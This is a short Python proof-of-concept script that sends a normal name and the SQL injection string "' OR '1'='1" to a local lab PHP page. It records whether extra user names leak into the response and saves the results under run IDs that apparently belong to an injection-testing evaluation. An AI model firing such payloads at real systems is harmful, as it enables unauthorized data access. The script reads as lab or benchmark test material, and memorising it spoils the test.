import json, urllib.parse, urllib.request, urllib.error
from pathlib import Path
base='http://127.0.0.1:4280/lab_cases/S001/index.php'
ids=['INJ_SQLI_IGNORE_BASE','INJ_SQLI_IGNORE_DEF','INJ_SQLI_SAFE_BASE','INJ_SQLI_SAFE_DEF','INJ_SQLI_LEAK_BASE','INJ_SQLI_LEAK_DEF','INJ_SQLI_DIVERT_BASE','INJ_SQLI_DIVERT_DEF']
def fetch(name):
 u=base+'?'+urllib.parse.urlencode({'name':name}); req=urllib.request.Request(u,headers={'User-Agent':'S001-local-poc'}); op=urllib.request.build_opener(urllib.request.HTTPRedirectHandler())
 try:
  with op.open(req,timeout=10) as r:return r.status,r.read().decode('utf-8','replace'),r.geturl()
 except Exception as e:return None,'ERROR:'+repr(e),u
out=[]
for rid in ids:
 s1,b1,u1=fetch('Alice'); s2,b2,u2=fetch("' OR '1'='1")
 row={'run_id':rid,'poc_executed':True,'target':base,'normal':{'status':s1,'contains':{x:x in b1 for x in ['Alice','Bob','Carol']},'url':u1},'test':{'status':s2,'contains':{x:x in b2 for x in ['Alice','Bob','Carol']},'url':u2},'write_operation':False,'observation':'normal/test requests completed; response comparison recorded'}
 out.append(row)
Path('results/B_S001_poc_execution_2026-10-25.json').write_text(json.dumps(out,ensure_ascii=False,indent=2)+'\n',encoding='utf8')
print(json.dumps(out,ensure_ascii=False,indent=2))
